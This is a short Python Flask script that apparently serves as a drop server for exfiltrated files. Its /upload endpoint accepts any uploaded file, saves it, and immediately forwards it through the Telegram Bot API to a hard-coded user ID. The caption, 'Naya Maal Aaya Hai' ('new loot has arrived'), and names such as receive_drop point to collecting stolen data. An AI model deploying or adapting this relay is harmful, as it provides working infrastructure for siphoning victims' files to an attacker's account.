import os
import requests
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

# .env file load karo
load_dotenv()

app = Flask(__name__)

# --- CONFIGURATION ---
UPLOAD_FOLDER = 'received_files'
TELEGRAM_TOKEN = os.getenv("BOT_TOKEN")
USER_ID = "8614779308"  # Tera User ID
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def send_to_telegram(file_path, filename):
    """Telegram pe file bhenjne ka function"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            payload = {'chat_id': USER_ID, 'caption': f"🚨 Naya Maal Aaya Hai!\nFile: {filename}"}
            files = {'document': file}
            response = requests.post(url, data=payload, files=files)
            if response.status_code == 200:
                print(f"✅ Telegram pe bhej diya: {filename}")
            else:
                print(f"❌ Telegram Error: {response.text}")
    except Exception as e:
        print(f"⚠️ Error sending to Telegram: {e}")

# --- ROUTES ---

@app.route('/')
def home():
    return "<h1>System Online</h1><p>Waiting for incoming data...</p>", 200

@app.route('/upload', methods=['POST'])
def receive_drop():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
        
    if file:
        filename = secure_filename(file.filename)
        save_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(save_path)
        
        # 🔥 MAGIC STEP: File save hote hi Telegram pe bhejo
        send_to_telegram(save_path, filename)
        
        return jsonify({"status": "success", "message": "Data received and forwarded to DM!"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
  
